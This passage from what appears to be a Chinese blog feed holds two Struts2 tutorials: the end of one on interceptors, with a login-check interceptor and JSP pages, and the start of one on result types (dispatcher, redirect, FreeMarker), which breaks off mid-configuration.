继续向下执行</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            actionContext.put(<span class="string">"msg"</span>, <span class="string">"您还未登录，请先登录！"</span>);</span><br><span class="line">            <span class="keyword">return</span> Action.LOGIN; <span class="comment">// 如果用户不存在，则返回login值</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置struts.xml文件，此文件用于声明自定义拦截器、拦截器栈以及对book操作的Action：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"struts2"</span> <span class="attr">namespace</span>=<span class="string">"/"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 声明拦截器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"privilege"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.interceptor.PrivilegeInterceptor"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"myStack"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"defaultStack"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"privilege"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 用户登录操作 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.action.LoginAction"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>/main.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"input"</span>&gt;</span>/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 关于book操作 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"book_*"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.action.BookAction"</span> <span class="attr">method</span>=<span class="string">"&#123;1&#125;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"login"</span>&gt;</span>/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 在action中使用自定义拦截器 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"myStack"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建main.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;主页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;table border=<span class="string">"0"</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;《SSH框架整合实战教程》&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;a href="/st2test/book_buy"&gt;购买&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>新建login.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">        input[type=text],input[type=password]&#123;width:<span class="number">150</span>px&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"/st2test/login.action"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">        &lt;table&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;label style="text-align:right;"&gt;用戶名：&lt;/label&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type="text" name="username"&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;span style="color:#F00"&gt;$&#123;requestScope.msg &#125;&lt;/span&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;label style="text-align:right;"&gt;密&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;/label&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type="password" name="password"&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td align="right" colspan="2"&gt;&lt;input type="submit" value="登录"&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>新建success.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;成功页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">尊敬的会员$&#123;user.username &#125;，您已成功购买商品，祝您购物愉快！</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="/2020/05/01/Struts2基础篇之Interceptor（拦截器）/1.png" alt=""></p><p><img src="/2020/05/01/Struts2基础篇之Interceptor（拦截器）/2.png" alt=""></p><p><img src="/2020/05/01/Struts2基础篇之Interceptor（拦截器）/3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之ResultType（结果类型）</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8BResultType%EF%BC%88%E7%BB%93%E6%9E%9C%E7%B1%BB%E5%9E%8B%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之ResultType（结果类型）/</id>
    <published>2020-04-30T16:00:02.000Z</published>
    <updated>2020-08-15T06:40:23.530Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-ResultType简介"><a href="#0x01-ResultType简介" class="headerlink" title="0x01 ResultType简介"></a>0x01 ResultType简介</h2><p>ResultType即结果类型。</p><p><code>&lt;results&gt;</code>标签在Struts2 MVC框架中扮演视图的角色。Action负责执行业务逻辑，下一步就是使用<code>&lt;results&gt;</code>标签显示视图。</p><p>Struts提供了许多预定义的结果类型，我们已经看到的是默认的结果类型dispatcher，它用于分发到JSP页面。Struts2允许你使用其他标记语言为视图技术呈现结果，较常选用的包括Velocity，Freemaker，XSLT和Tiles。</p><h2 id="0x02-配置Result"><a href="#0x02-配置Result" class="headerlink" title="0x02 配置Result"></a>0x02 配置Result</h2><p>在 struts.xml 文件中，<code>&lt;result&gt;</code> 元素用于配置 Result 逻辑视图与物理视图之间的映射关系，它有两个可选属性 name 和 type。其中，name 属性用于指定逻辑视图的名称，默认值为 success；type 属性用于指定返回的视图资源的类型，不同的类型代表不同的结果输出，它的默认值是 dispatcher。</p><p>struts.xml 文件中的 <code>&lt;result&gt;</code> 元素配置示例代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"loginAction"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.LoginAction"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span> <span class="attr">type</span>=<span class="string">"dispatcher"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"location"</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码为 Action 配置了一个 name 为 success 的 Result 映射，该映射的值可以是 JSP 页面，也可以是一个 Action 的 name 值；这里使用 param 子元素为其指定了 Result 映射对应的物理视图资源为 success.jsp。</p><p><code>&lt;param&gt;</code> 子元素的 name 属性有两个值，分别如下：</p><ul><li>location：指定该逻辑视图所对应的实际视图资源。</li><li>parse：指定在逻辑视图资源名称中是否可以使用 OGNL（对象图导航语言）表达式。默认值为 true，表示可以使用，如果设为 false，则表示不支持。</li></ul><p>其实，上述配置代码还可以简化为如下形式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"loginAction"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.LoginAction"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要注意的是，在 Result 配置中指定实际资源位置时，可以使用绝对路径，也可以使用相对路径。</p><ul><li>绝对路径以斜杠“/”开头，例如<code>&lt;result&gt;/success.jsp&lt;/result&gt;</code>，相当于当前 Web 应用程序的上下文路径。</li><li>相对路径不以斜杠“/”开头，例如 <code>&lt;result&gt;success.jsp&lt;/result&gt;</code>，相当于当前执行的 Action 路径。</li></ul><h2 id="0x03-预定义的ResultType"><a href="#0x03-预定义的ResultType" class="headerlink" title="0x03 预定义的ResultType"></a>0x03 预定义的ResultType</h2><p>在使用 Struts2 框架编写项目时，当框架调用 Action 对请求进行处理后，就要向用户呈现一个结果视图。在 Struts2 中，预定义了多种 ResultType（结果类型）展示结果视图。</p><p>一个结果类型就是实现了 com.opensymphony.xwork2.Result 接口的类，Struts2 把内置的 <code>&lt;result-type&gt;</code> 都放在 struts-default 包中，struts-default 包就是配置包的父包，这个包定义在 struts2-core-2.3.24.jar 包的根目录下的 struts-default.xml 文件中，在该文件中可以找到相关的 <code>&lt;result-type&gt;</code> 的定义，其代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result-types</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"chain"</span> <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.ActionChainResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"dispatcher"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.ServletDispatcherResult"</span> <span class="attr">default</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"freemarker"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.views.freemarker.FreemarkerResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"httpheader"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.HttpHeaderResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"redirect"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.ServletRedirectResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"redirectAction"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.ServletActionRedirectResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"stream"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.StreamResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"velocity"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.VelocityResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"xslt"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.views.xslt.XSLTResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"plainText"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.PlainTextResult"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"postback"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.PostbackResult"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result-types</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，每个 <code>&lt;result-type&gt;</code> 元素都是一种视图技术或者跳转方式的封装，其中 name 属性指出在 <code>&lt;result&gt;</code> 元素中如何引用这种视图技术或者跳转方式，它对应着 <code>&lt;result&gt;</code> 元素的 type 属性。class 属性表示这种结果类型的对应类。</p><p>Struts2 中预定义的 ResultType 说明如表所示。</p><table><thead><tr><th>属   性</th><th>说   明</th></tr></thead><tbody><tr><td>chain</td><td>用于处理 Action 链，被跳转的 Action 中仍能获取上个页面的值，如 request 信息</td></tr><tr><td>dispatcher</td><td>用于转向页面，通常处理 JSP，是默认的结果类型</td></tr><tr><td>freemarker</td><td>用于整合 FreeMarker 模板结果类型</td></tr><tr><td>httpheader</td><td>用于处理特殊的 HTTP 行为结果类型</td></tr><tr><td>redirect</td><td>重定向到一个 URL，被跳转的页面中丢失传递的信息</td></tr><tr><td>redirectAction</td><td>重定向到一个 Action，跳转的页面中丢失传递的信息</td></tr><tr><td>stream</td><td>向浏览器发送 InputStream 对象，通常用于处理文件下载，还可用于 Ajax 数据</td></tr><tr><td>velocity</td><td>用于整合 Velocity 模板结果类型</td></tr><tr><td>xslt</td><td>用于整合 XML/XSLT 结果类型</td></tr><tr><td>plainText</td><td>显示原始文件内容，如文件源代码</td></tr><tr><td>postback</td><td>使当前请求参数以表单形式提交</td></tr></tbody></table><p>表中列举了 Struts2 中预定义的全部 11 种结果类型，其中 dispatcher 是默认的结果类型，主要用于与 JSP 整合。在这全部 11 种结果类型中，dispatcher 和 redirect 是比较常用的结果类型。</p><p>需要注意的是，redirect 与 dispatcher 结果类型非常相似，所不同的是 dispatcher 结果类型是将请求转发到 JSP 视图资源，而 redirect 结果类型是将请求重定向到 JSP 视图资源。如果重定向了请求，那么将丢失所有参数，包括 Action 的处理结果。</p><h2 id="0x04-dispatcher结果类型"><a href="#0x04-dispatcher结果类型" class="headerlink" title="0x04 dispatcher结果类型"></a>0x04 dispatcher结果类型</h2><p>dispatcher 是 Struts2 的默认结果类型，它用于表示转发到指定结果资源。</p><p>由于 Struts2 在后台使用 RequestDispatcher 的 forward() 方法转发请求，所以在用户的整个请求/响应过程中，保持的是同一个请求对象，即目标 JSP/Servlet 接收到的请求/响应对象与最初的 JSP/Servlet 的请求/响应对象相同。</p><p>dispatcher 结果类型的对应类是 org.apache.struts2.dispatcher.ServletDispatcherResult，该类有 location 和 parse 两个属性，可以通过 struts.xml 配置文件中的 <code>&lt;result&gt;</code> 元素的 <code>&lt;param&gt;</code> 子元素设置，代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span> <span class="attr">type</span>=<span class="string">"dispatcher"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"location"</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"parse"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，location 参数用于指定 Action 执行完毕后要转向的目标资源；parse 参数是一个布尔类型的值，默认是 true，表示解析 location 参数中的 OGNL 表达式，如果为 false，则不解析。</p><h2 id="0x05-redirect结果类型"><a href="#0x05-redirect结果类型" class="headerlink" title="0x05 redirect结果类型"></a>0x05 redirect结果类型</h2><p>redirect 结果类型用于重定向到指定的结果资源，该资源可以是 JSP 文件，也可以是 Action 类。使用 redirect 结果类型时，系统将调用 HttpServletResponse 的 sendRedirect() 方法将请求重定向到指定的 URL。</p><p>redirect 结果类型的对应类是 org.apache.struts2.dispatcher.ServletRedirectResult。在使用 redirect 时，用户要完成一次和服务器之间的交互，浏览器需要发送两次请求，请求过程如图：</p><p><img src="/2020/05/01/Struts2基础篇之ResultType（结果类型）/3.png" alt=""></p><p>使用 redirect 结果类型的工作过程如下。</p><ol><li>浏览器发出一个请求，Struts2框架调用对应的Action实例对请求进行处理。</li><li>Action返回success结果字符串，Struts2框架根据这个结果选择对应的结果类型，这里使用的是redirect结果类型。</li><li>ServletRedirectResult在内部使用HttpServletResponse的sendRedirect()方法将请求重新定向到目标资源。</li><li>浏览器重新发起一个针对目标资源的新请求。</li><li>目标资源作为响应呈现给用户。</li></ol><p>Demo案例参考：<a href="http://c.biancheng.net/view/4101.html" target="_blank" rel="noopener">http://c.biancheng.net/view/4101.html</a></p><h2 id="0x06-Freemaker结果类型"><a href="#0x06-Freemaker结果类型" class="headerlink" title="0x06 Freemaker结果类型"></a>0x06 Freemaker结果类型</h2><p>Freemaker是一个流行的模板引擎，使用预定义的模板生成输出。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>hello.fm，FreeMarker模板文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is FreeMarker test, $&#123;name&#125;</span><br></pre></td></tr></table></figure><p>HelloWorldAction类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldAction</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=ISO-8859-1"</span></span><br><span class="line">         pageEncoding=<span class="string">"ISO-8859-1"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span></span><br><span class="line"><span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Hello World&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hello World From Struts2&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">"hello"</span>&gt;</span><br><span class="line">  &lt;label for="name"&gt;Please enter your name&lt;/label&gt;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Say Hello"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>配置struts.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.devMode"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"helloworld"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"hello"</span> 